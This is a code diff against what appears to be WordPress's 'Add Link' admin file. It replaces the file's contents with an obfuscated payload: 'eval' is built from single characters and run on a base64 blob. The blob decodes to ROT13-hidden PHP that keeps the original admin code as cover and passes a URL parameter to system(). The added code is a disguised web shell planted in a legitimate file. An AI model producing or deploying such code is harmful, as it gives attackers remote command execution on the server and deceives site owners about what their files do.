@@ -1,44 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Add Link Administration Screen.
- *
- * @package WordPress
- * @subpackage Administration
- */
-
-/** Load WordPress Administration Bootstrap */
-require_once __DIR__ . '/admin.php';
-
-if ( ! current_user_can( 'manage_links' ) ) {
-	wp_die( __( 'Sorry, you are not allowed to add links to this site.' ) );
-}
-
-// Used in the HTML title tag.
-$title       = __( 'Add Link' );
-$parent_file = 'link-manager.php';
-
-$action  = ! empty( $_REQUEST['action'] ) ? sanitize_text_field( $_REQUEST['action'] ) : '';
-$cat_id  = ! empty( $_REQUEST['cat_id'] ) ? absint( $_REQUEST['cat_id'] ) : 0;
-$link_id = ! empty( $_REQUEST['link_id'] ) ? absint( $_REQUEST['link_id'] ) : 0;
-
-wp_enqueue_script( 'link' );
-wp_enqueue_script( 'xfn' );
-
-if ( wp_is_mobile() ) {
-	wp_enqueue_script( 'jquery-touch-punch' );
-}
-
-$link = get_default_link_to_edit();
-require ABSPATH . 'wp-admin/edit-link-form.php';
-
-require_once ABSPATH . 'wp-admin/admin-footer.php';
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogTnFxIFl2YXggTnF6dmF2Zmdlbmd2YmEgRnBlcnJhLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgTnF6dmF2Zmdlbmd2YmEKICovCgovKiogWWJucSBKYmVxQ2VyZmYgTnF6dmF2Zmdlbmd2YmEgT2JiZ2ZnZW5jICovCmVyZGh2ZXJfYmFwciBfX1FWRV9fIC4gJy9ucXp2YS5jdWMnOwoKdnMgKCAhIHBoZWVyYWdfaGZyZV9wbmEoICd6bmFudHJfeXZheGYnICkgKSB7CglqY19xdnIoIF9fKCAnRmJlZWwsIGxiaCBuZXIgYWJnIG55eWJqcnEgZ2IgbnFxIHl2YXhmIGdiIGd1dmYgZnZnci4nICkgKTsKfQoKLy8gSGZycSB2YSBndXIgVUdaWSBndmd5ciBnbnQuCiRndmd5ciAgICAgICA9IF9fKCAnTnFxIFl2YXgnICk7CiRjbmVyYWdfc3Z5ciA9ICd5dmF4LXpuYW50cmUuY3VjJzsKCiRucGd2YmEgID0gISByemNnbCggJF9FUkRIUkZHWyducGd2YmEnXSApID8gZm5hdmd2bXJfZ3JrZ19zdnJ5cSggJF9FUkRIUkZHWyducGd2YmEnXSApIDogJyc7CiRwbmdfdnEgID0gISByemNnbCggJF9FUkRIUkZHWydwbmdfdnEnXSApID8gbm9mdmFnKCAkX0VSREhSRkdbJ3BuZ192cSddICkgOiAwOwokeXZheF92cSA9ICEgcnpjZ2woICRfRVJESFJGR1sneXZheF92cSddICkgPyBub2Z2YWcoICRfRVJESFJGR1sneXZheF92cSddICkgOiAwOwoKamNfcmFkaHJocl9mcGV2Y2coICd5dmF4JyApOwpqY19yYWRocmhyX2ZwZXZjZyggJ2tzYScgKTsKCnZzICggamNfdmZfemJvdnlyKCkgKSB7CglqY19yYWRocmhyX2ZwZXZjZyggJ3dkaHJlbC1nYmhwdS1jaGFwdScgKTsKfQoKJHl2YXggPSB0cmdfcXJzbmh5Z195dmF4X2diX3JxdmcoKTsKZXJkaHZlciBOT0ZDTkdVIC4gJ2pjLW5xenZhL3JxdmcteXZheC1zYmV6LmN1Yyc7CgplcmRodmVyX2JhcHIgTk9GQ05HVSAuICdqYy1ucXp2YS9ucXp2YS1zYmJncmUuY3VjJzsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
